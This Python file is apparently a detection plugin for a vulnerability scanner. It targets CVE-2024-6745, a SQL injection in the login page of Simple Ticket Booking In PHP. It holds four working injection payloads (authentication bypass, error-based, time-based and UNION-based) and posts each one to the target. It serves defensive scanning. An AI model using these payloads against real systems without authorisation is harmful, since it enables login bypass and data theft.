"""Agent Asteroid implementation for CVE-2024-6745."""

from agent import definitions
from agent import exploits_registry

from requests import exceptions as requests_exceptions

VULNERABILITY_TITLE = "SQL Injection in Simple Ticket Booking"
VULNERABILITY_REFERENCE = "CVE-2024-6745"
VULNERABILITY_DESCRIPTION = (
    "A SQL injection vulnerability in 'adminauthenticate.php' of Simple Ticket Booking In PHP allows attackers "
    "to manipulate SQL queries via the 'email' parameter, potentially gaining unauthorized access."
)
RISK_RATING = "HIGH"
RECOMMENDATION = (
    "Implement proper input validation and parameterized queries to mitigate SQL injection attacks. "
    "Update the 'adminauthenticate.php' script to handle user inputs securely."
)
DEFAULT_TIMEOUT = 30

PAYLOADS = [
    "email=-2616' OR 2047=2047#&password=admin123&login_submit=",
    "email=asdmin' OR (SELECT 2229 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(2229=2229,1))),"
    "0x7176706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- "
    "cDlE&password=admin123&login_submit=",
    "email=asdmin' AND (SELECT 4082 FROM (SELECT(SLEEP(5)))ooOg)-- DHwI&password=admin123&login_submit=",
    "email=asdmin' UNION ALL SELECT NULL,CONCAT(0x716a7a6b71,"
    "0x57616a50584e70676f7a6b4654687477784649747a716576706c50784e7049677459774357414641,0x7176706271),NULL,"
    "NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rPiQ&password=admin123&login_submit=",
]


@exploits_registry.register
class SimpleTicketBookingSQLInjectionExploit(definitions.Exploit):
    """CVE-2024-6745: SQL Injection in Simple Ticket Booking App."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        recommendation=RECOMMENDATION,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Checks if the target is the Simple Ticket Booking App.
        """
        try:
            response = self.session.post(
                f"{target.origin}/adminauthenticate.php", timeout=DEFAULT_TIMEOUT
            )
            if (
                response.status_code == 200
                and "<title>Mh-Ticket</title>" in response.text
            ):
                return True
            return False
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Checks for SQL Injection vulnerability in Simple Ticket Booking.
        """
        vulnerabilities = []

        for payload in PAYLOADS:
            try:
                response = self.session.post(
                    f"{target.origin}/adminauthenticate.php",
                    data=payload,
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=True,
                )
                if (
                    response.status_code == 200
                    and "action ='adminauthenticate.php'" in response.text
                ):
                    vulnerability = self.create_vulnerability(target)
                    vulnerability.technical_detail = f"{target.origin}/adminauthenticate.php is vulnerable to {VULNERABILITY_REFERENCE}: {VULNERABILITY_TITLE}"
                    vulnerabilities.append(vulnerability)
            except requests_exceptions.RequestException:
                return []
        return vulnerabilities
